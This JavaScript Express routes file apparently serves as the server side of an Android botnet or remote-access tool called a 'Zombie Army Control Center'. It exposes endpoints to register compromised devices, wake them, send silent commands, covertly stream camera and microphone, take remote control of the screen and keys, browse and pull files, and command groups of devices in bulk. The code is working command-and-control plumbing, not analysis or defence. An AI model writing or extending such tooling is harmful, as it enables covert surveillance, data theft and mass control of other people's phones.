/**
 * Zombie Army Dashboard Routes - Ghost Resurrection System
 * 
 * Provides REST API endpoints for the Zombie Army Control Center.
 * Enables individual device control and mass army management.
 */

const express = require('express');
const router = express.Router();

function createZombieRoutes(ghostManager) {
    
    /**
     * GET /api/zombie/dashboard
     * Get zombie army dashboard overview
     */
    router.get('/dashboard', (req, res) => {
        try {
            const dashboard = ghostManager.getZombieArmyDashboard();
            res.json({
                success: true,
                data: dashboard
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/register
     * Register a new zombie device
     */
    router.post('/register', (req, res) => {
        try {
            const { fcmToken, deviceId, name, model, androidVersion, ipAddress, capabilities } = req.body;
            
            if (!fcmToken || !deviceId) {
                return res.status(400).json({
                    success: false,
                    error: 'FCM token and device ID are required'
                });
            }

            const zombie = ghostManager.registerZombieDevice({
                fcmToken,
                deviceId,
                name,
                model,
                androidVersion,
                ipAddress,
                capabilities
            });

            res.json({
                success: true,
                message: 'Zombie device registered successfully',
                data: zombie
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:deviceId/wake
     * Wake up a specific zombie device
     */
    router.post('/:deviceId/wake', async (req, res) => {
        try {
            const { deviceId } = req.params;
            const { reason } = req.body;
            
            const result = await ghostManager.wakeUpZombie(deviceId, reason || 'manual_wake');
            
            if (result.success) {
                res.json({
                    success: true,
                    message: `Zombie ${deviceId} awakened successfully`,
                    data: result
                });
            } else {
                res.status(400).json({
                    success: false,
                    error: result.error
                });
            }
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:deviceId/shutdown
     * Force shutdown a zombie session
     */
    router.post('/:deviceId/shutdown', async (req, res) => {
        try {
            const { deviceId } = req.params;
            
            const result = await ghostManager.shutdownZombie(deviceId);
            
            if (result.success) {
                res.json({
                    success: true,
                    message: `Zombie ${deviceId} shutdown successfully`,
                    data: result
                });
            } else {
                res.status(400).json({
                    success: false,
                    error: result.error
                });
            }
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:deviceId/command
     * Execute silent command on zombie device
     */
    router.post('/:deviceId/command', async (req, res) => {
        try {
            const { deviceId } = req.params;
            const { command } = req.body;
            
            if (!command) {
                return res.status(400).json({
                    success: false,
                    error: 'Command is required'
                });
            }

            const result = await ghostManager.executeZombieCommand(deviceId, command);
            
            if (result.success) {
                res.json({
                    success: true,
                    message: `Command sent to zombie ${deviceId}`,
                    data: result
                });
            } else {
                res.status(400).json({
                    success: false,
                    error: result.error
                });
            }
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/army/wake
     * Wake up multiple zombies (zombie army)
     */
    router.post('/army/wake', async (req, res) => {
        try {
            const { deviceIds, reason } = req.body;
            
            if (!Array.isArray(deviceIds) || deviceIds.length === 0) {
                return res.status(400).json({
                    success: false,
                    error: 'Device IDs array is required'
                });
            }

            const result = await ghostManager.wakeUpZombieArmy(deviceIds, reason || 'mass_wake');
            
            res.json({
                success: true,
                message: `Zombie army wake command executed: ${result.successful}/${result.totalAttempted} successful`,
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/:deviceId/status
     * Get status of specific zombie device
     */
    router.get('/:deviceId/status', (req, res) => {
        try {
            const { deviceId } = req.params;
            const zombie = ghostManager.getZombieByDeviceId(deviceId);
            
            if (!zombie) {
                return res.status(404).json({
                    success: false,
                    error: 'Zombie device not found'
                });
            }

            const session = ghostManager.activeSessions.get(deviceId);
            
            res.json({
                success: true,
                data: {
                    ...zombie,
                    isActive: !!session,
                    session: session || null
                }
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/list
     * Get list of all zombie devices
     */
    router.get('/list', (req, res) => {
        try {
            const zombies = ghostManager.getAllZombies();
            const sessions = ghostManager.getActiveSessions();
            
            const zombieList = zombies.map(zombie => ({
                ...zombie,
                isActive: sessions.some(session => session.deviceId === zombie.deviceId)
            }));

            res.json({
                success: true,
                data: {
                    totalZombies: zombies.length,
                    activeZombies: sessions.length,
                    zombies: zombieList
                }
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/sessions
     * Get all active zombie sessions
     */
    router.get('/sessions', (req, res) => {
        try {
            const sessions = ghostManager.getActiveSessions();
            
            res.json({
                success: true,
                data: {
                    activeSessions: sessions.length,
                    sessions: sessions
                }
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/:id/details
     * Get detailed information about a specific zombie device
     */
    router.get('/:id/details', (req, res) => {
        try {
            const deviceId = req.params.id;
            const details = ghostManager.getDeviceDetails(deviceId);
            
            if (!details.success) {
                return res.status(404).json(details);
            }
            
            res.json({
                success: true,
                data: details.device
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:id/advanced-command
     * Execute advanced command with priority and parameters
     */
    router.post('/:id/advanced-command', async (req, res) => {
        try {
            const deviceId = req.params.id;
            const commandData = req.body;
            
            if (!commandData.command) {
                return res.status(400).json({
                    success: false,
                    error: 'Command is required'
                });
            }
            
            const result = await ghostManager.executeAdvancedCommand(deviceId, commandData);
            
            if (!result.success) {
                return res.status(400).json(result);
            }
            
            res.json(result);
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:id/schedule-command
     * Schedule command for future execution
     */
    router.post('/:id/schedule-command', (req, res) => {
        try {
            const deviceId = req.params.id;
            const { commandData, scheduleTime } = req.body;
            
            if (!commandData || !scheduleTime) {
                return res.status(400).json({
                    success: false,
                    error: 'Command data and schedule time are required'
                });
            }
            
            const result = ghostManager.scheduleCommand(deviceId, commandData, scheduleTime);
            res.json(result);
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/:id/analytics
     * Get device performance analytics
     */
    router.get('/:id/analytics', (req, res) => {
        try {
            const deviceId = req.params.id;
            const analytics = ghostManager.getDeviceAnalytics(deviceId);
            
            if (!analytics.success) {
                return res.status(404).json(analytics);
            }
            
            res.json({
                success: true,
                data: analytics.analytics
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/all/details
     * Get detailed information for all zombie devices
     */
    router.get('/all/details', (req, res) => {
        try {
            const devices = ghostManager.getAllDeviceDetails();
            res.json({
                success: true,
                data: devices,
                count: devices.length
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/bulk/command
     * Execute command on multiple devices
     */
    router.post('/bulk/command', async (req, res) => {
        try {
            const { deviceIds, commandData } = req.body;
            
            if (!deviceIds || !Array.isArray(deviceIds) || deviceIds.length === 0) {
                return res.status(400).json({
                    success: false,
                    error: 'Device IDs array is required'
                });
            }
            
            if (!commandData || !commandData.command) {
                return res.status(400).json({
                    success: false,
                    error: 'Command data is required'
                });
            }
            
            const result = await ghostManager.executeBulkCommand(deviceIds, commandData);
            res.json(result);
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/emergency/shutdown-all
     * Emergency shutdown for all active sessions
     */
    router.post('/emergency/shutdown-all', async (req, res) => {
        try {
            const result = await ghostManager.emergencyShutdownAll();
            res.json(result);
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/army/statistics
     * Get comprehensive army statistics
     */
    router.get('/army/statistics', (req, res) => {
        try {
            const dashboard = ghostManager.getZombieArmyDashboard();
            const devices = ghostManager.getAllDeviceDetails();
            
            // Calculate advanced statistics
            const totalCommands = devices.reduce((sum, device) => 
                sum + (device.commandsExecuted || 0), 0);
            
            const averageSuccessRate = devices.length > 0 ? 
                devices.reduce((sum, device) => sum + (device.successRate || 99.5), 0) / devices.length : 0;
            
            const connectionQualities = devices.reduce((acc, device) => {
                const quality = device.connectionQuality || 'unknown';
                acc[quality] = (acc[quality] || 0) + 1;
                return acc;
            }, {});

            const statistics = {
                ...dashboard,
                totalCommands,
                averageSuccessRate: Math.round(averageSuccessRate * 10) / 10,
                connectionQualities,
                devicesByAndroidVersion: devices.reduce((acc, device) => {
                    const version = device.androidVersion || 'unknown';
                    acc[version] = (acc[version] || 0) + 1;
                    return acc;
                }, {}),
                devicesByCapabilities: devices.reduce((acc, device) => {
                    (device.capabilities || []).forEach(capability => {
                        acc[capability] = (acc[capability] || 0) + 1;
                    });
                    return acc;
                }, {}),
                performanceScores: devices.map(device => ({
                    deviceId: device.id,
                    score: device.performanceScore || 0,
                    health: device.healthStatus || 'unknown'
                }))
            };
            
            res.json({
                success: true,
                data: statistics
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });
    
    // Live Streaming Routes
    
    // Start camera stream
    router.post('/:id/stream/camera/start', async (req, res) => {
        try {
            const deviceId = req.params.id;
            const options = req.body;
            
            const result = await ghostManager.startCameraStream(deviceId, options);
            
            res.json({
                success: result.success,
                message: result.success ? 'Camera stream started' : 'Failed to start camera stream',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });
    
    // Stop camera stream
    router.post('/:id/stream/camera/stop', async (req, res) => {
        try {
            const deviceId = req.params.id;
            
            const result = await ghostManager.stopCameraStream(deviceId);
            
            res.json({
                success: result.success,
                message: result.success ? 'Camera stream stopped' : 'Failed to stop camera stream',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });
    
    // Start audio stream
    router.post('/:id/stream/audio/start', async (req, res) => {
        try {
            const deviceId = req.params.id;
            const options = req.body;
            
            const result = await ghostManager.startAudioStream(deviceId, options);
            
            res.json({
                success: result.success,
                message: result.success ? 'Audio stream started' : 'Failed to start audio stream',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });
    
    // Stop audio stream
    router.post('/:id/stream/audio/stop', async (req, res) => {
        try {
            const deviceId = req.params.id;
            
            const result = await ghostManager.stopAudioStream(deviceId);
            
            res.json({
                success: result.success,
                message: result.success ? 'Audio stream stopped' : 'Failed to stop audio stream',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });
    
    // Start live session (camera + audio)
    router.post('/:id/stream/live/start', async (req, res) => {
        try {
            const deviceId = req.params.id;
            const options = req.body;
            
            const result = await ghostManager.startLiveSession(deviceId, options);
            
            res.json({
                success: result.success,
                message: result.success ? 'Live session started' : 'Failed to start live session',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });
    
    // Stop live session
    router.post('/:id/stream/live/stop', async (req, res) => {
        try {
            const deviceId = req.params.id;
            
            const result = await ghostManager.stopLiveSession(deviceId);
            
            res.json({
                success: result.success,
                message: result.success ? 'Live session stopped' : 'Failed to stop live session',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    // ===========================================
    // ARMY FORMATION MANAGEMENT ROUTES
    // ===========================================

    /**
     * GET /api/zombie/groups
     * Get all zombie groups/formations
     */
    router.get('/groups', (req, res) => {
        try {
            const groups = ghostManager.getZombieGroups();
            res.json({
                success: true,
                data: groups
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/groups
     * Create a new zombie group/formation
     */
    router.post('/groups', (req, res) => {
        try {
            const { name, description, type, deviceIds } = req.body;
            
            if (!name || !deviceIds || !Array.isArray(deviceIds)) {
                return res.status(400).json({
                    success: false,
                    error: 'Group name and device IDs array are required'
                });
            }

            const group = ghostManager.createZombieGroup({
                name,
                description,
                type: type || 'custom',
                deviceIds
            });

            res.json({
                success: true,
                message: `Group "${name}" created successfully`,
                data: group
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * PUT /api/zombie/groups/:groupId
     * Update an existing zombie group
     */
    router.put('/groups/:groupId', (req, res) => {
        try {
            const groupId = req.params.groupId;
            const updates = req.body;
            
            const group = ghostManager.updateZombieGroup(groupId, updates);
            
            if (!group) {
                return res.status(404).json({
                    success: false,
                    error: 'Group not found'
                });
            }

            res.json({
                success: true,
                message: 'Group updated successfully',
                data: group
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * DELETE /api/zombie/groups/:groupId
     * Delete a zombie group
     */
    router.delete('/groups/:groupId', (req, res) => {
        try {
            const groupId = req.params.groupId;
            
            const success = ghostManager.deleteZombieGroup(groupId);
            
            if (!success) {
                return res.status(404).json({
                    success: false,
                    error: 'Group not found'
                });
            }

            res.json({
                success: true,
                message: 'Group deleted successfully'
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/groups/:groupId/activate
     * Activate all devices in a group
     */
    router.post('/groups/:groupId/activate', async (req, res) => {
        try {
            const groupId = req.params.groupId;
            
            const result = await ghostManager.activateZombieGroup(groupId);
            
            res.json({
                success: result.success,
                message: result.message,
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/mass-operation
     * Execute mass operation on selected devices or groups
     */
    router.post('/mass-operation', async (req, res) => {
        try {
            const { operation, targets, command } = req.body;
            
            if (!operation || !targets) {
                return res.status(400).json({
                    success: false,
                    error: 'Operation type and targets are required'
                });
            }

            const result = await ghostManager.executeMassOperation({
                operation,
                targets,
                command
            });

            res.json({
                success: result.success,
                message: result.message,
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/formation-templates
     * Get available formation templates
     */
    router.get('/formation-templates', (req, res) => {
        try {
            const templates = ghostManager.getFormationTemplates();
            res.json({
                success: true,
                data: templates
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/auto-formation
     * Auto-create formations based on template
     */
    router.post('/auto-formation', (req, res) => {
        try {
            const { template, name } = req.body;
            
            if (!template) {
                return res.status(400).json({
                    success: false,
                    error: 'Formation template is required'
                });
            }

            const groups = ghostManager.createAutoFormation(template, name);

            res.json({
                success: true,
                message: `Auto-formation created using ${template} template`,
                data: groups
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    // ===========================================
    // INTERACTIVE CONTROL PANEL ROUTES
    // ===========================================

    /**
     * POST /api/zombie/:id/remote-desktop/connect
     * Start remote desktop session
     */
    router.post('/:id/remote-desktop/connect', async (req, res) => {
        try {
            const deviceId = req.params.id;
            
            const result = await ghostManager.startRemoteDesktop(deviceId);
            
            res.json({
                success: result.success,
                message: result.success ? 'Remote desktop session started' : 'Failed to start remote desktop',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:id/remote-desktop/disconnect
     * Stop remote desktop session
     */
    router.post('/:id/remote-desktop/disconnect', async (req, res) => {
        try {
            const deviceId = req.params.id;
            
            const result = await ghostManager.stopRemoteDesktop(deviceId);
            
            res.json({
                success: result.success,
                message: result.success ? 'Remote desktop session stopped' : 'Failed to stop remote desktop',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:id/touch-simulation
     * Simulate touch on device screen
     */
    router.post('/:id/touch-simulation', async (req, res) => {
        try {
            const deviceId = req.params.id;
            const { x, y, tool, action } = req.body;
            
            const result = await ghostManager.simulateTouch(deviceId, { x, y, tool, action });
            
            res.json({
                success: result.success,
                message: result.success ? 'Touch simulated successfully' : 'Failed to simulate touch',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:id/key-input
     * Send key input to device
     */
    router.post('/:id/key-input', async (req, res) => {
        try {
            const deviceId = req.params.id;
            const { key, keyCode, action } = req.body;
            
            const result = await ghostManager.sendKeyInput(deviceId, { key, keyCode, action });
            
            res.json({
                success: result.success,
                message: result.success ? 'Key input sent successfully' : 'Failed to send key input',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/:id/file-browser
     * Browse device file system
     */
    router.get('/:id/file-browser', async (req, res) => {
        try {
            const deviceId = req.params.id;
            const path = req.query.path || '/sdcard/';
            
            const result = await ghostManager.browseFiles(deviceId, path);
            
            res.json({
                success: result.success,
                message: result.success ? 'File list retrieved' : 'Failed to browse files',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:id/file-transfer
     * Transfer file to/from device
     */
    router.post('/:id/file-transfer', async (req, res) => {
        try {
            const deviceId = req.params.id;
            const { action, sourcePath, targetPath, data } = req.body;
            
            const result = await ghostManager.transferFile(deviceId, { action, sourcePath, targetPath, data });
            
            res.json({
                success: result.success,
                message: result.success ? 'File transfer completed' : 'Failed to transfer file',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/emergency-response
     * Execute emergency response action
     */
    router.post('/emergency-response', async (req, res) => {
        try {
            const { action, targets, confirm } = req.body;
            
            if (!action) {
                return res.status(400).json({
                    success: false,
                    error: 'Emergency action is required'
                });
            }

            if (!confirm) {
                return res.status(400).json({
                    success: false,
                    error: 'Emergency action must be confirmed'
                });
            }

            const result = await ghostManager.executeEmergencyResponse({ action, targets });
            
            res.json({
                success: result.success,
                message: result.message,
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/:id/system-info
     * Get detailed system information
     */
    router.get('/:id/system-info', async (req, res) => {
        try {
            const deviceId = req.params.id;
            
            const result = await ghostManager.getSystemInfo(deviceId);
            
            res.json({
                success: result.success,
                message: result.success ? 'System info retrieved' : 'Failed to get system info',
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/:deviceId/info
     * Get comprehensive device information with real-time data
     */
    router.get('/:deviceId/info', (req, res) => {
        try {
            const { deviceId } = req.params;
            const deviceInfo = ghostManager.getDeviceInfo(deviceId);
            
            if (!deviceInfo.device) {
                return res.status(404).json({
                    success: false,
                    error: 'Device not found'
                });
            }

            res.json({
                success: true,
                data: deviceInfo
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/:deviceId/stats
     * Get real-time device statistics
     */
    router.get('/:deviceId/stats', (req, res) => {
        try {
            const { deviceId } = req.params;
            const stats = ghostManager.getDeviceStats(deviceId);
            
            if (!stats) {
                // Request fresh stats if none available
                ghostManager.requestDeviceStats(deviceId);
                return res.json({
                    success: true,
                    data: null,
                    message: 'Stats requested, try again in a few seconds'
                });
            }

            res.json({
                success: true,
                data: stats
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:deviceId/command/advanced
     * Execute advanced command with parameters
     */
    router.post('/:deviceId/command/advanced', async (req, res) => {
        try {
            const { deviceId } = req.params;
            const { type, parameters } = req.body;
            
            if (!type) {
                return res.status(400).json({
                    success: false,
                    error: 'Command type is required'
                });
            }

            const command = await ghostManager.executeAdvancedCommand(deviceId, {
                type,
                parameters
            });

            res.json({
                success: true,
                data: command
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/:deviceId/history
     * Get command execution history
     */
    router.get('/:deviceId/history', (req, res) => {
        try {
            const { deviceId } = req.params;
            const history = ghostManager.getCommandHistory(deviceId);
            
            res.json({
                success: true,
                data: history
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/batch/command
     * Execute batch command on multiple devices
     */
    router.post('/batch/command', async (req, res) => {
        try {
            const { deviceIds, command } = req.body;
            
            if (!deviceIds || !Array.isArray(deviceIds) || deviceIds.length === 0) {
                return res.status(400).json({
                    success: false,
                    error: 'Device IDs array is required'
                });
            }

            if (!command || !command.type) {
                return res.status(400).json({
                    success: false,
                    error: 'Command with type is required'
                });
            }

            const result = await ghostManager.executeBatchCommand(deviceIds, command);

            res.json({
                success: true,
                data: result
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:deviceId/stream/start
     * Start live streaming session
     */
    router.post('/:deviceId/stream/start', async (req, res) => {
        try {
            const { deviceId } = req.params;
            const { type = 'camera' } = req.body;
            
            const streamSession = await ghostManager.startLiveStreaming(deviceId, type);

            res.json({
                success: true,
                data: streamSession
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/stream/:streamId/stop
     * Stop live streaming session
     */
    router.post('/stream/:streamId/stop', async (req, res) => {
        try {
            const { streamId } = req.params;
            
            const streamSession = await ghostManager.stopLiveStreaming(streamId);

            res.json({
                success: true,
                data: streamSession
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/streams/active
     * Get all active streaming sessions
     */
    router.get('/streams/active', (req, res) => {
        try {
            const activeStreams = ghostManager.getActiveStreams();
            
            res.json({
                success: true,
                data: activeStreams
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * GET /api/zombie/command/:commandId/status
     * Get command execution status
     */
    router.get('/command/:commandId/status', (req, res) => {
        try {
            const { commandId } = req.params;
            const command = ghostManager.getCommandStatus(commandId);
            
            if (!command) {
                return res.status(404).json({
                    success: false,
                    error: 'Command not found'
                });
            }

            res.json({
                success: true,
                data: command
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:deviceId/response
     * Handle device command response (called by Android app)
     */
    router.post('/:deviceId/response', (req, res) => {
        try {
            const { deviceId } = req.params;
            const { commandId, response } = req.body;
            
            if (!commandId || !response) {
                return res.status(400).json({
                    success: false,
                    error: 'Command ID and response are required'
                });
            }

            ghostManager.handleCommandResponse(deviceId, commandId, response);

            res.json({
                success: true,
                message: 'Response processed'
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    /**
     * POST /api/zombie/:deviceId/stats
     * Handle device stats update (called by Android app)
     */
    router.post('/:deviceId/stats', (req, res) => {
        try {
            const { deviceId } = req.params;
            const { stats } = req.body;
            
            if (!stats) {
                return res.status(400).json({
                    success: false,
                    error: 'Stats data is required'
                });
            }

            ghostManager.handleStatsUpdate(deviceId, stats);

            res.json({
                success: true,
                message: 'Stats updated'
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });

    return router;
}

module.exports = createZombieRoutes;
